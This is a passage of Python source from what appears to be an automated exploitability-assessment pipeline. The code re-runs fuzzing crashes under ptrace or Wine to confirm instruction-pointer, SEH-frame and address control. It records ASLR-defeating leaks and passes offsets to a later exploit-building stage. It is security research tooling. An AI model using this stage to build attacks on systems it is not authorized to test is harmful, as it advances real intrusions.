                return _finalize(ctx, target, target_bytes, mode, base_argv, cap0, control,
                                 prim, bool(prim.get("confirmed")), extra, frame=_frame_bytes, relength=_frame_relength)

            # 2d) and the classes that describe a MAGNITUDE rather than an access.
            prim = _quantity_primitive(ctx, target, exe, mode, base_argv, orig, _pre, _post,
                                       timeout, first=_first)
            if prim is not None:
                control = frame(orig[len(_pre):len(orig) - len(_post)] if (_pre or _post)
                                else orig)
                extra = primitive.quantity_effect(prim)
                return _finalize(ctx, target, target_bytes, mode, base_argv, cap0, control,
                                 prim, bool(prim.get("confirmed")), extra, frame=_frame_bytes, relength=_frame_relength)

            # 2f) the uninitialised-value class: the last one in this stage with no verdict of
            # its own. Its experiment is not a variation but a LOOK AT THE BYTES -- see
            # `_uninit_primitive`.
            prim = _uninit_primitive(ctx, target, exe, mode, base_argv, orig, _pre, _post,
                                     timeout, first=_first, target_bytes=target_bytes)
            if prim is not None:
                control = frame(orig[len(_pre):len(orig) - len(_post)] if (_pre or _post)
                                else orig)
                extra = primitive.uninit_effect(prim)
                return _finalize(ctx, target, target_bytes, mode, base_argv, cap0, control,
                                 prim, bool(prim.get("confirmed")), extra, frame=_frame_bytes, relength=_frame_relength)

        # 3) nothing to claim. Where the defect's CLASS is one this stage cannot reason about --
        # a data race, an uninitialised read -- say which and why, because the generic note reads
        # as if the right question had been asked and answered. Measured: a ThreadSanitizer data
        # race and an MSan uninitialised read both ended on "no instruction-pointer / memory
        # primitive found", which sends the reader looking for a missing capability instead of at
        # `mem_oracle` (the uninit verdict) or at a timing experiment this stage does not run.
        _cls = (_first or {}).get("class")
        _why = primitive.no_verdict_reason(_cls)
        # The cyclic faulted and said nothing about control -- which is the read-class defect's
        # normal outcome, since there is no saved return address in play. Ask the address
        # question here too, for the same reason it is asked when the cyclic does not fault at
        # all. Skipped when a SANITIZER reported the defect: those classes have their own
        # verdicts above, measured from a report rather than from a faulting instruction.
        if not _cls and not emulated:
            _av, _demo, _dcap, _dmode = _address_verdict(
                ctx, lambda m: _capture_for(m), sweep_modes(mode, orig),
                orig, target.arch or "x86-64",
                siblings=_address_siblings(ctx, target, input_sha),
                endianness=target.endianness)
            if _av and _av.get("confirmed"):
                _disc = _address_disclosure(ctx, target, _dmode or mode, base_argv, orig, _av,
                                            timeout)
                if _disc:
                    _av["disclosure"] = {k: _disc[k] for k in
                                         ("proved", "rule", "pie_base", "libc_base", "canary",
                                           "distinct", "disclosed_bytes", "note", "input_sha", "code_ptrs")
                                         if k in _disc}
                return _finalize(ctx, target, target_bytes, _dmode, base_argv, _dcap, _demo,
                                 _av, True, {"after": "no register control"})
        ctx.emit("primitive.done", payload={
            "primitive": ("register-control" if regs else None), "supported": True,
            "registers": regs, "signal": cap0.get("signal_name"), "sanitizer_class": _cls,
            "note": (f"no primitive verdict for {_cls}: {_why}" if _why else
                     "crash reproduced but no instruction-pointer / memory primitive found")})
        ctx.progress(pct=100, msg=(f"{_cls}: no verdict ({_why[:60]})" if _why
                                   else "crash without a controllable primitive"))
        return {}
    finally:
        shutil.rmtree(helper.parent, ignore_errors=True)


#: How many input bytes the address experiment may probe, and with which values. Each probe is
#: one ptrace-captured detonation (milliseconds native), so the budget is generous for the
#: minimized crash inputs this runs on and bounded for anything larger.
_ADDR_PROBE_OFFSETS = 48
_ADDR_PROBE_VALUES = (0x00, 0x40, 0x80, 0xff)


#: Sibling crashes to fold in. The campaign that produced this input usually produced several,
#: and they are the cheapest observations available: already recorded, already known to fault.
_ADDR_SIBLINGS = 6


def _address_siblings(ctx, target, input_sha, limit: int = _ADDR_SIBLINGS) -> list:
    """Other recorded crashing inputs for this target -- free observations for the experiment.

    Single-byte variation answers "does THIS byte move the address". Two crashes from the same
    fuzzing campaign answer a broader question -- does the address move with the input at all --
    and they cost nothing to collect, because the run that found them already stored them.
    Measured on busybox: one input's fault lands at 0x0 and another's at a mapped-page address,
    which is the difference between "null-pointer DoS" and "the attacker chooses where".
    """
    out: list = []
    try:
        from ...db.dao import DynResultDAO
        seen = {input_sha}
        for r in DynResultDAO(ctx.conn).list_by_target(target.id):
            if not getattr(r, "crashed", False):
                continue
            sha = getattr(r, "input_sha", None)
            if not sha or sha in seen:
                continue
            seen.add(sha)
            try:
                out.append((sha, ctx.content.get_bytes(sha)))
            except Exception:                          # noqa: BLE001 -- an evicted artifact
                observe.absorbed(_log, "skipping a sibling crash")
            if len(out) >= limit:
                break
    except Exception:                                  # noqa: BLE001 -- advisory
        observe.absorbed(_log, "continuing without sibling crashes")
    return out


def _address_verdict(ctx, capture_for, modes, orig: bytes, arch: str, siblings=(),
                     endianness=None):
    """(verdict, demonstrating-input, capture, mode) for the ADDRESS of an uninstrumented fault.

    The experiment the sanitizer families cannot run on a stripped binary: re-detonate the
    crashing input, then vary one byte at a time and watch where the fault lands. The ptrace
    helper has recorded `fault_addr` (si_addr) all along; nothing ever read it for a verdict, so
    a crash whose address the attacker chooses -- an arbitrary read or write -- was reported as
    "crash reproduced but no controllable primitive found", and `root_cause` filed whichever
    address that one input happened to produce (0x0 for busybox's lzcat crash, which made a
    controlled read read as a null-pointer denial of service).

    Returns (None, ...) when the input does not fault here at all, which is the one case where
    the caller's existing decline is the honest answer.
    """
    base_cap, base_mode = None, None
    tried: list = []
    for m in modes:
        cap = capture_for(m)(orig)
        tried.append(f"{m}:" + ("fault@0x%x" % cap["fault_addr"]
                                if cap.get("ok") and cap.get("fault_addr") is not None
                                else str(cap.get("signal_name") or cap.get("reason") or "no")))
        if cap.get("ok") and cap.get("signal_name") and cap.get("fault_addr") is not None:
            base_cap, base_mode = cap, m
            break
    if base_cap is None:
        # An experiment that says nothing has to say WHY: this is the one branch where the
        # answer is "the crash we were handed does not reproduce here", which is a different
        # statement from "the address is fixed" and sends the reader somewhere else entirely.
        ctx.emit("primitive.address", payload={
            "ran": False, "channels": tried,
            "why": "the crashing input did not fault under the capture on any channel"})
        return None, b"", {}, ""
    cap_fn = capture_for(base_mode)
    disasm = rootcause.disasm_one(bytes.fromhex(base_cap.get("pc_bytes", "")), arch,
                                  base_cap.get("endianness") or endianness,
                                  bool(base_cap.get("thumb")))
    is_write = rootcause._is_memory_write(disasm)
    # NOT this family's question. A fault at a `ret`, or with the PC outside executable memory,
    # is instruction-pointer control: the address it "touched" is the hijacked target, which
    # moves with the input for a reason the cyclic experiment exists to measure exactly. Reading
    # it as "the attacker chooses where this read goes" would relabel a control-flow hijack as a
    # read primitive -- measured on the stack-overflow fixture, which this branch now declines.
    _cls = (rootcause.classify(base_cap, disasm) or {}).get("class")
    if _cls in ("control-flow-hijack", "stack-return-overwrite"):
        ctx.emit("primitive.address", payload={
            "ran": False, "class": _cls,
            "why": ("this fault is instruction-pointer control, which the cyclic experiment "
                    "measures; the address question does not apply to it")})
        return None, b"", {}, ""
    base_addr = int(base_cap["fault_addr"])
    # The same input twice: an address that moves between runs of ONE input is not a function of
    # the input (a heap pointer under ASLR, a pid, a clock) and no control claim can be made.
    obs = [("orig", base_cap), ("orig", cap_fn(orig))]
    best = (0, None, b"")                                  # (|delta|, offset, input)
    step = max(1, len(orig) // _ADDR_PROBE_OFFSETS)
    for off in range(0, len(orig), step):
        v = 0xFF if orig[off] != 0xFF else 0x00
        var = bytearray(orig); var[off] = v
        cap = cap_fn(bytes(var))
        obs.append((f"byte@{off}=0x{v:02x}", cap))
        if cap.get("ok") and cap.get("fault_addr") is not None:
            d = abs(int(cap["fault_addr"]) - base_addr)
            if d > best[0]:
                best = (d, off, bytes(var))
    # The campaign's OTHER crashes, each one a free observation of the same question.
    for sha, data in siblings or ():
        cap = cap_fn(data)
        obs.append((f"crash@{sha[:8]}", cap))
        if cap.get("ok") and cap.get("fault_addr") is not None:
            d = abs(int(cap["fault_addr"]) - base_addr)
            if d > best[0]:
                best = (d, None, data)                 # a different input, not a byte lever
    # The lever found, now its SCALE: several values of that one byte, which is what separates
    # "an index into N-byte elements" from "some other byte-dependent address".
    if best[1] is not None:
        for v in _ADDR_PROBE_VALUES:
            if v == orig[best[1]]:
                continue
            var = bytearray(orig); var[best[1]] = v
            obs.append((f"byte@{best[1]}=0x{v:02x}", cap_fn(bytes(var))))
    verdict = primitive.address_primitive(obs, disasm=disasm, is_write=is_write)
    _faulted = [lbl for lbl, c in obs
                if (c or {}).get("ok") and (c or {}).get("fault_addr") is not None]
    ctx.emit("primitive.address", payload={
        "ran": True, "channel": base_mode, "observations": len(obs), "faulted": len(_faulted),
        "distinct_addresses": len({int(c["fault_addr"]) for _l, c in obs
                                   if (c or {}).get("fault_addr") is not None}),
        "verdict": (verdict or {}).get("effect_kind"),
        "why": None if verdict else ("fewer than three of the variants faulted at one "
                                     "instruction, so the question could not be asked")})
    demo = best[2] or orig
    demo_cap = base_cap
    if verdict and verdict.get("controlled"):
        for lbl, cap in obs:
            if cap.get("ok") and cap.get("fault_addr") == verdict.get("addr_max"):
                demo_cap = cap
                break
    else:
        demo = orig
    return verdict, demo, demo_cap, base_mode


def _pe_ip_primitive(ctx, target, exe, target_bytes, mode, base_argv, orig, timeout):
    """L2 for a Windows PE, via Wine's `+seh` crash dump (the one window into Win64 guest state the
    host ptrace tracer cannot reach). Detonate a cyclic pattern, then recover the control offset
    from the guest register dump + walked SEH frames, distinguishing -- honestly -- two outcomes:

      * the faulting RIP itself holds the cyclic bytes -> a true instruction-pointer hijack
        (`instruction-pointer-control`), the strong L2, confirmed by the canonical marker landing
        in the PC on a re-detonation;
      * only the saved frame pointer (rbp) and/or the Wine SEH registration frame hold them ->
        `seh-frame-control`, confirmed by a NUL-free sentinel landing in that slot. This is a
        Windows SEH-overwrite / stack-pivot LEAD, not an automatic instruction-pointer hijack:
        x64 SEH is table-based (.pdata/.xdata), so the overwritten on-stack frame pointer is not
        dispatched through, and a frame-pointer-based (`leave`) epilogue faults reading the
        corrupt frame before any `ret` reaches a controlled address. The verdict says exactly
        that and files the control-flow consequence as POTENTIAL, never demonstrated.

    Self-contained on purpose: the ELF path's replay harnesses, sanitizer twins, ptrace/qemu
    captures, siginfo address verdicts and Ghidra frame seeding all assume a host-traceable ELF."""
    word = 8 if (target.bits or 64) >= 64 else 4
    arch = target.arch or "x86-64"
    # Pass 1 scopes to 64-bit PE: `make_wine_capture` parses the x64 `+seh` dump (rip/rsp/rbp); a
    # 32-bit (WoW64) guest reports eip/esp/ebp through a different dump -- a real but separate lane.
    if word != 8:
        ctx.emit("primitive.done", payload={"primitive": None, "supported": False,
                 "note": "L2 for a 32-bit PE: the Wine crash dump is 32-bit (eip/esp/ebp) and the "
                         "WoW64 capture lane is not built yet; the PE is still analysed statically "
                         "and reproduced to L1 under Wine"})
        ctx.progress(pct=100, msg="L2 not yet supported for a 32-bit PE")
        return {}
    endian = "little"
    length = min(max(len(orig) * 2, 256), 4096)
    pattern = primitive.cyclic(length)

    # Feed the cyclic down the recorded channel first, then the others -- a crashing input fed the
    # wrong way does not fault, and reporting that as "no L2" turns a wrong setup into a negative.
    cap0, used_mode, tried = {}, mode, []
    for m in sweep_modes(mode, pattern):
        tried.append(m)
        cap0 = make_wine_capture(exe, m, base_argv, timeout, arch=arch, bits=word * 8)(pattern)
        if cap0.get("ok") and cap0.get("signal_name"):
            used_mode = m
            break
    if not (cap0.get("ok") and cap0.get("signal_name")):
        ctx.emit("primitive.done", payload={
            "primitive": None, "supported": True, "input_modes_tried": tried,
            "note": "cyclic pattern did not fault under Wine via " + ", ".join(tried)
                    + ": " + str(cap0.get("reason", ""))})
        ctx.progress(pct=100, msg="no Wine fault under cyclic pattern (tried %s)"
                     % ", ".join(tried))
        return {}
    capture = make_wine_capture(exe, used_mode, base_argv, timeout, arch=arch, bits=word * 8)

    # 1) a true instruction-pointer hijack: the faulting PC holds the cyclic bytes. Confirm with
    #    the canonical marker (a `ret` lands on it, PC==MARKER), exactly as the native path does.
    pc = cap0.get("pc")
    pc_off = (primitive.cyclic_find(primitive._reg_window(pc, word, endian, 4), length, 4)
              if pc else -1)
    regs = primitive.controlled_registers(cap0, length, endian=endian, word=word)
    if pc_off != -1:
        ctx.progress(msg=f"confirming instruction-pointer control at offset {pc_off} (pc)")
        control = primitive.control_input(pc_off, length, word, endian)
        confirmed = primitive.marker_confirmed(capture(control), word, endian)
        prim = {"type": "instruction-pointer-control", "offset": pc_off, "source": "pc",
                "marker": primitive._ip_marker(word), "observed_pc": pc, "confirmed": confirmed,
                "registers": regs, "substrate": "wine"}
        extra = (f"instruction-pointer control at offset {pc_off} (pc), "
                 + ("confirmed" if confirmed else "unconfirmed") + " under Wine +seh")
        return _finalize(ctx, target, target_bytes, used_mode, base_argv, cap0, control,
                         prim, confirmed, extra)

    # 2) controlled saved frame pointer / SEH registration frame -- the honest SEH-overwrite lead.
    seh = cap0.get("seh_frame")
    seh_off = (primitive.cyclic_find(primitive._reg_window(seh, word, endian, 4), length, 4)
               if seh else -1)
    fp_off = regs.get("rbp", -1)
    off = fp_off if fp_off != -1 else seh_off
    if off != -1:
        ctx.progress(msg=f"confirming saved-frame-pointer / SEH-frame control at offset {off}")
        control = primitive.pe_frame_control_input(off, length, word)
        where = primitive.pe_frame_confirmed(capture(control), word)
        confirmed = bool(where)
        prim = {"type": "seh-frame-control", "offset": off,
                "source": "rbp" if fp_off != -1 else "seh_frame",
                "marker": primitive.pe_frame_sentinel(word), "observed_pc": pc,
                "confirmed": confirmed, "registers": regs, "seh_frame": seh,
                "substrate": "wine"}
        _slot = {"rbp": "the saved frame pointer (rbp)", "seh_frame": "the SEH registration frame",
                 "": "the saved frame pointer / SEH frame"}[where]
        extra = (f"controlled saved frame pointer / SEH registration frame at offset {off}, "
                 + (f"confirmed under Wine +seh (sentinel in {_slot})" if confirmed
                    else "unconfirmed under Wine +seh")
                 + " -- a Windows SEH-overwrite / stack-pivot lead; x64 SEH is table-based, so "
                 "this is not an automatic instruction-pointer hijack")
        return _finalize(ctx, target, target_bytes, used_mode, base_argv, cap0, control,
                         prim, confirmed, extra)

    # 3) the crash reproduces under Wine but no register/frame carries attacker bytes.
    ctx.emit("primitive.done", payload={
        "primitive": None, "supported": True, "input_modes_tried": tried,
        "note": "the cyclic pattern faults the PE under Wine (" + str(cap0.get("nt_status"))
                + ") but no saved register or SEH frame holds the pattern -- reproduced at L1, "
                "no controllable L2 primitive recovered"})
    ctx.progress(pct=100, msg="Wine crash reproduced; no controllable primitive in the dump")
    return {}


def _finalize(ctx, target, target_bytes, mode, base_argv, cap0, control, prim, confirmed,
              extra, *, frame=(b"", b""), relength: bool = False):
    """Bundle the demonstrating input, record an L2 (or L1) PoC, promote the crash finding on
    confirmation, and emit the result -- shared by every primitive kind."""
    # A verdict may CAP its own level. L2 means a confirmed exploitation primitive, and not every
    # confirmed claim is one: an attacker-chosen allocation size or leak volume is an availability
    # defect -- demonstrated, worth reporting, and not a primitive. Calling it one would inflate
    # the single number in a report that exists to resist inflation. The verdict states the cap
    # itself (`max_level`) rather than this function guessing from the type name.
    level = "L2" if (confirmed and int(prim.get("max_level") or 2) >= 2) else "L1"
    control_sha = ctx.put_artifact("poc-l2-input", data=control)
    meta = {"target_sha256": target.sha256, "arch": target.arch, "input_mode": mode,
            "level": level, "primitive": prim, "tool_version": TOOL_VERSION}
    data = bundle.build(target_bytes, control, meta, b"", mode, base_argv,
                        cap0.get("signal_name") or "SIGSEGV", primitive=prim)
    bundle_sha = ctx.put_artifact("poc-bundle", data=data,
                                  meta={"level": level, "verified": confirmed})
    poc_id = PocDAO(ctx.conn).insert(target.id, target.case_id, level=level,
                                     verified=confirmed, signal_name=cap0.get("signal_name"),
                                     input_sha=control_sha, bundle_sha=bundle_sha)
    if confirmed:
        fd = FindingDAO(ctx.conn)
        # A confirmed primitive DEMONSTRATES an end effect -- headline it and relabel the crash
        # finding authoritatively (RIP control -> RCE, write-what-where -> arbitrary write,
        # controlled read -> info disclosure), instead of leaving it as "Reproduced crash".
        # An L2 instruction-pointer-control primitive DEMONSTRATES a control-flow hijack -- not
        # code execution. Under NX/ASLR no attacker code has run at this level; that is precisely
        # what the L3 exploit stage proves (and then upgrades RCE to demonstrated). Reporting L2 as
        # "RCE demonstrated" is an over-claim, so IP-control headlines a demonstrated hijack and
        # carries RCE only as POTENTIAL. Write/read primitives ARE their effect, so stay demonstrated.
        _EFF = {"instruction-pointer-control": ("control-flow-hijack", "Control-flow hijack"),
                # A Windows stack smash with CONFIRMED control of the saved frame pointer / SEH
                # registration frame. What is demonstrated is the memory corruption (the overwrite
                # of a saved pointer at a known offset); the control-flow-hijack consequence is a
                # LEAD and is filed separately as POTENTIAL below.
                "seh-frame-control": ("memory-corruption",
                                      "Stack buffer overflow (saved frame pointer / SEH control)"),
                "write-what-where": ("memory-corruption", "Memory corruption (arbitrary write)"),
                "arbitrary-write": ("memory-corruption", "Memory corruption (arbitrary write)"),
                "arbitrary-read": ("info-disclosure", "Information disclosure (memory leak)"),
                "controlled-read": ("info-disclosure", "Information disclosure (memory leak)"),
                "controlled-oob-read": ("info-disclosure",
                                        "Information disclosure (out-of-bounds read)"),
                "oob-read": ("info-disclosure", "Information disclosure (out-of-bounds read)"),
                "controlled-oob-write": ("memory-corruption",
                                         "Memory corruption (out-of-bounds write)"),
                "oob-write": ("memory-corruption", "Memory corruption (out-of-bounds write)"),
                "controlled-uaf-read": ("info-disclosure",
                                        "Information disclosure (use-after-free read)"),
                "uaf-read": ("info-disclosure",
                             "Information disclosure (use-after-free read)"),
                "controlled-uaf-write": ("memory-corruption",
                                         "Memory corruption (use-after-free write)"),
                "uaf-write": ("memory-corruption", "Memory corruption (use-after-free write)"),
                "controlled-double-free": ("memory-corruption",
                                           "Memory corruption (allocator state, double free)"),
                "double-free": ("memory-corruption",
                                "Memory corruption (allocator state, double free)"),
                "controlled-bad-free": ("memory-corruption",
                                        "Memory corruption (free of a foreign address)"),
                "bad-free": ("memory-corruption",
                             "Memory corruption (free of a foreign address)"),
                "controlled-alloc-dealloc-mismatch": (
                    "memory-corruption", "Memory corruption (allocator mismatch)"),
                "alloc-dealloc-mismatch": ("memory-corruption",
                                           "Memory corruption (allocator mismatch)")}
        _kind_title = _EFF.get(prim.get("type"))
        # A QUANTITY verdict carries its own effect kind and status -- availability for a refused
        # allocation or a leak, memory corruption marked POTENTIAL for a negative length the
        # sanitizer intercepted before the copy. Read off the verdict so there is one definition
        # rather than a second table that has to agree with the first.
        if prim.get("race"):
            # A race's consequence depends on what the unsynchronised value is used for, which
            # this stage does not determine -- so it headlines the DEFECT and files no effect
            # claim. The reproduction rate is the contribution, and it is in the detail.
            _kind_title = None
        elif prim.get("uninit"):
            # Headlined by WHETHER THE BYTES LEFT. A disclosure of residue is an information
            # disclosure and says so; a value used only inside the process has no effect to
            # claim, so it headlines the defect and files its consequence as potential.
            _kind_title = (prim["effect_kind"] or "info-disclosure",
                           ("Information disclosure (uninitialised memory)"
                            if prim.get("escaped")
                            else "Use of an uninitialised value (potential)"))
        elif prim.get("disclosure"):
            # An out-of-bounds read that returns pixel data and one that returns the image load
            # base are both "information disclosure", and only one of them hands an attacker the
            # missing half of a chain. Say which this is in the HEADLINE: the distinction decides
            # whether a reader goes looking for a write primitive to pair it with, and burying it
            # in the detail line means the two findings sort identically.
            _d = prim["disclosure"]
            _got = ", ".join(n for n, k in (("image base", "pie_base"), ("libc base", "libc_base"),
                                            ("stack canary", "canary")) if _d.get(k) is not None)
            _kind_title = ("info-disclosure",
                           f"ASLR defeated by an out-of-bounds read (discloses the {_got})")
        elif prim.get("quantity"):
            _title = _QUANTITY_TITLE.get(prim["sanitizer_class"], "Resource exhaustion")
            _kind_title = (prim["effect_kind"],
                           _title + ("" if prim["effect_status"] == "demonstrated"
                                     else " (potential)"))
        # Key on the ORIGINAL crash's faulting address (as root_cause does), NOT this capture's,
        # so the primitive finding merges into the crash finding instead of forking a duplicate:
        # on a native target the fault PC is in the dedup key, and omitting it here split one
        # defect into two poc-backed findings.
        _orig = (ctx.params or {}).get("input_sha")
        # ...and the DISCRIMINATOR, or a sanitizer abort keys to the signal alone and merges
        # every such defect into one finding. See `crash_key_parts`.
        _fpc, _disc, _hj = crash_key_parts(ctx.conn, target.id, _orig)
        # The capture substrate, for provenance: a PE's registers come from Wine's +seh dump, not
        # ptrace -- labelling a PE finding "ptrace" would name a tracer that never touched it.
        _substrate = prim.get("substrate") or "ptrace"
        cand = crash_finding_candidate(
            cap0.get("signal_name"), control_sha, _substrate, "primitive",
            f"({level} primitive: {extra})", state="poc-backed", confidence=0.98,
            bundle_sha=bundle_sha, fault_pc=_fpc, discriminator=_disc, hijack=_hj)
        if _kind_title:
            _kind, _title = _kind_title
            cand["title"] = (f"{_title} (demonstrated): L2 primitive" if level == "L2"
                             else f"{_title}: attacker-controlled magnitude")
            cand["authoritative"] = True
            # Keep root_cause's CWE only where it already names a MEMORY-CORRUPTION defect --
            # there it genuinely is more specific than a signal-derived class. Where it does not,
            # keeping it makes the finding contradict its own headline. Measured on a service
            # carved out of a SquashFS firmware image: the stack smash left a near-null return
            # address, root_cause classified the fault as CWE-476 (null-pointer dereference), and
            # the finding went out as "Control-flow hijack (demonstrated): L2 primitive" carrying
            # a DoS-grade weakness id -- so anyone filtering for memory corruption would never
            # see a CONFIRMED instruction-pointer hijack at a known stack offset. A confirmed
            # primitive is direct evidence of what the write did, which outranks a guess made
            # from where the process happened to land.
            _prim_cwe = _PRIM_CWE.get(prim.get("type"))
            _prior = next((f for f in fd.list_by_target(target.id)
                           if f.dedup_key == cand["dedup_key"]), None)
            # A QUANTITY verdict is not an override of root_cause's class -- it IS the
            # sanitizer's class, and the crash finding it merges into was labelled from the
            # SIGNAL. Measured: a refused 2 TB allocation went out as CWE-787 (out-of-bounds
            # write) because SIGABRT resolves to that and `_PRIM_CWE` deliberately has no entry
            # for this family. The same no-downgrade guard applies: a finding that already names
            # memory corruption keeps it.
            if prim.get("quantity") and prim.get("cwe"):
                _prim_cwe = prim["cwe"]
            # Same situation, one class further on: the uninitialised-value family's weakness is
            # the sanitizer's own (CWE-457, or CWE-200 once the bytes have left the process) and
            # `_PRIM_CWE` deliberately has no entry for it -- neither id belongs to the
            # memory-corruption family that table is allowed to install.
            if prim.get("uninit") and prim.get("cwe"):
                _prim_cwe = prim["cwe"]
            if _prim_cwe and (_prior.cwe if _prior else None) not in _MEM_CORRUPTION:
                cand["cwe"] = _prim_cwe
                cand["title_only"] = False
                if prim.get("type") == "instruction-pointer-control":
                    cand["severity"] = "critical"       # RIP control, confirmed under ptrace
                elif prim.get("type") == "seh-frame-control":
                    # A confirmed stack smash controlling the saved frame pointer / SEH frame --
                    # high, not critical: the control-flow hijack is a lead, not demonstrated RIP.
                    cand["severity"] = "high"
                elif prim.get("uninit"):
                    # From the VERDICT, not from the signal. MemorySanitizer halts the process,
                    # so `_SIG_CWE["SIGABRT"]` rates every uninitialised read `high` -- including
                    # the half where nothing left the process, which the sanitizer itself rates
                    # medium. That is the substrate deciding the severity instead of the defect,
                    # which is the complaint written out in full beside the PE exceptions in
                    # that same table.
                    cand["severity"] = "high" if prim.get("escaped") else "medium"
            else:
                cand["title_only"] = True              # keep root_cause's specific CWE
            # Promote the matching end effect to DEMONSTRATED and attach the L2 bundle that
            # proves it -- the confirmed primitive (RIP control / write-what-where / controlled
            # read), the exact input that achieves it, and how (offset, captured marker).
            _effects = [{
                "kind": _kind, "title": _title,
                # The verdict decides its own status: a consequence the sanitizer PREVENTED (a
                # negative length intercepted before the copy, an index whose access is undefined
                # rather than performed) is potential, not demonstrated.
                "status": prim.get("effect_status") or "demonstrated", "detail": extra,
                "proof": {"type": "bundle", "sha": bundle_sha, "input_sha": control_sha,
                          "note": extra}}]
            if prim.get("type") == "instruction-pointer-control":
                # RCE is POTENTIAL at L2 (hijack achieved, code execution not shown); L3 upgrades it.
                _effects.append({"kind": "rce", "title": "Remote code execution",
                                 "status": "potential",
                                 "detail": "control-flow hijack achieved at L2; code execution not "
                                           "demonstrated at this level (see L3 exploit)"})
            elif prim.get("type") == "seh-frame-control":
                # The memory corruption above is DEMONSTRATED; the control-flow hijack it leads to
                # is only POTENTIAL. x64 SEH is table-based, so the overwritten on-stack frame
                # pointer is not dispatched through automatically -- reaching the instruction
                # pointer needs a stack pivot / SEH-overwrite chain the Windows weaponizer does not
                # yet build. Saying "demonstrated" here would be the overclaim this whole stage
                # resists.
                _effects.append({"kind": "control-flow-hijack",
                                 "title": "Control-flow hijack (SEH overwrite / stack pivot)",
                                 "status": "potential",
                                 "detail": "saved frame pointer / SEH registration frame controlled "
                                           "at a known offset; x64 SEH is table-based, so this is a "
                                           "lead rather than an automatic instruction-pointer hijack"})
            cand.setdefault("evidence", []).append(
                {"channel": "effects", "detail": json.dumps(_effects)})
        fd.upsert(target.id, target.case_id, cand)
        fid = fd.id_for_dedup(target.id, cand["dedup_key"])   # the pc-keyed crash finding
        if fid:
            PocDAO(ctx.conn).set_finding(poc_id, fid)
    # `mode` is recorded alongside the offset because this stage is the only one that RESOLVES
    # it: the loop above feeds the crashing input down every channel until one faults, so by here
    # the channel is measured, not guessed. build_exploit inherits the offset from this payload
    # and used to re-guess the channel from how_to_feed, which ranks a `file` parser first on any
    # fopen import -- so a stdin smash in a binary that also opens a config file was delivered
    # as argv, where a NUL inside the win address truncates the copy. Its own re-probe cannot
    # correct that: it uses a bare cyclic, which a structured target never faults on at all.
    # `mode` and `frame_*` travel with the offset because this stage is the only one that
    # MEASURES them: the sweep above feeds the crashing input down every channel, in both
    # framings, until one faults. build_exploit used to inherit the offset alone and re-infer the
    # other two -- the channel from the import table, the framing from its own minimization --
    # and an offset against the wrong framing lands beside the control slot.
    # A recovered load base travels with them for the same reason, and it is the only one of the
    # four that build_exploit cannot measure for itself at all: it obtains a base from a STACK
    # over-read, and a heap over-read -- the shape this disclosure comes from -- never reaches
    # that code. Without this, an out-of-bounds read that provably defeats ASLR was recorded as
    # L2 and the rung above started again from "the target is PIE and we have no leak".
    _fp, _fs = frame
    _payload = {
        "primitive": prim["type"], "supported": True, "offset": prim.get("offset"),
        # The crash this L2 was MEASURED on. build_exploit weaponizes a specific crash; with several
        # distinct defects on one target it must inherit the offset/channel/disclosure measured on
        # THAT crash, not the newest L2 from an unrelated one. L3 prefers the matching input_sha and
        # falls back to any (so the crashless early attempt is unaffected). See exploit_stage
        # `_confirmed_l2`/`_l2_disclosure_triggers`.
        "input_sha": (ctx.params or {}).get("input_sha"),
        # WHERE the control came from: "pc", a return-address register, `reg:<r>` for an indirect
        # branch through a register (a hijacked function pointer), or a stack slot. L3 needs it to
        # choose: the one-jump recipes that pass the OBJECT as the callee's argument only apply to
        # the indirect-call shape, and claiming one on a smashed return address would be a lie.
        "source": prim.get("source"),
        "confirmed": confirmed, "level": level, "bundle": bundle_sha,
        "mode": mode, "base_argv": [str(a) for a in (base_argv or [])],
        "frame_prefix": (_fp or b"").hex(), "frame_suffix": (_fs or b"").hex(),
        # Whether the prefix's trailing LENGTH field was rewritten to the payload's length. The
        # offset was measured in that framing and means nothing in the other one, so it travels
        # with the prefix and the suffix -- see `relength_prefix`.
        "frame_relength": bool(relength)}
    if prim.get("disclosure"):
        _payload["disclosure"] = prim["disclosure"]
    if prim.get("type") == "address-control":
        # The verdict's own facts, in the event, because `primitive` here is only the type NAME
        # and this family's whole claim is quantitative: which instruction, which input byte,
        # what range of addresses. A reader -- or the report, or build_exploit -- cannot act on
        # "address-control" alone.
        _payload["address"] = {k: prim.get(k) for k in (
            "access", "pc", "disasm", "addr_min", "addr_max", "span", "offset", "stride",
            "cwe", "effect_kind", "observations", "controlled", "note")}
    ctx.emit("primitive.done", payload=_payload)
    ctx.progress(pct=100, msg=(f"L2 confirmed: {prim['type']}") if confirmed
                 else f"{prim['type']} indicated (unconfirmed)")
    return {"output_shas": [bundle_sha], "output_kind": "poc-bundle"}


def register() -> None:
    register_stage(PRIMITIVE_STAGE, primitive_stage, resource_class="cpu",
                   tool=TOOL, tool_version=TOOL_VERSION, timeout=300)


def enqueue_primitive(queue, target, *, params=None, force: bool = True):
    return queue.enqueue(target.case_id, PRIMITIVE_STAGE, target_id=target.id,
                         params=params or {}, input_hashes=[target.sha256], tool=TOOL,
                         tool_version=TOOL_VERSION, resource_class="cpu", force=force)
